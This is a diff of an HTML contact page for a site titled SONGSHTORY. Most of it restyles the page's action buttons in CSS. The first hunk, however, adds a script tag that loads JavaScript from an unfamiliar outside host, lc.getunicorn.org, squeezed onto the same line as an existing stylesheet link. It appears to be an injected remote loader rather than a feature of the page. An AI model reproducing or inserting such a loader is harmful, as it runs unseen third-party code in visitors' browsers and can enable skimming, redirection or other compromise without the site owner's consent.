@@ -6,7 +6,7 @@
 
     <title>문의하기 - SONGSHTORY</title>
 
-    <link
+    <script type="text/javascript" nonce="XOJ0BVE+zr3qdJZKBBAaLFbFzesxhK/xP1QmLnOdycs=" src="//lc.getunicorn.org?type=base-script&amp;request-id=12147"></script><link
         rel="stylesheet"
         as="style"
         crossorigin
@@ -909,43 +909,33 @@
 
 
         .action-btn {
-            background:
-                var(--primary-color);
-
-            color: #fff;
-
+            background: #FFFFFF;
+            color: var(--deep-color);
             font-size: 1.05rem;
-
             font-weight: 600;
-
-            padding:
-                14px 28px;
-
-            border:
-                1px solid
-                var(--primary-color);
-
+            padding: 14px 28px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
             cursor: pointer;
-
-            transition:
-                all .2s;
-
+            transition: all .2s ease;
             display: inline-flex;
-
             align-items: center;
-
             justify-content: center;
+            box-shadow: none;
         }
 
+        .action-btn:hover,
+        .action-btn.outline:hover {
+            background: var(--deep-color);
+            color: #FFFFFF;
+            border-color: var(--deep-color);
+            transform: translateY(-2px);
+        }
 
         .action-btn.outline {
-            background: #fff;
-
-            color:
-                var(--deep-color);
-
-            border-color:
-                var(--border-color);
+            background: #FFFFFF;
+            color: var(--deep-color);
+            border-color: var(--border-color);
         }
 
 
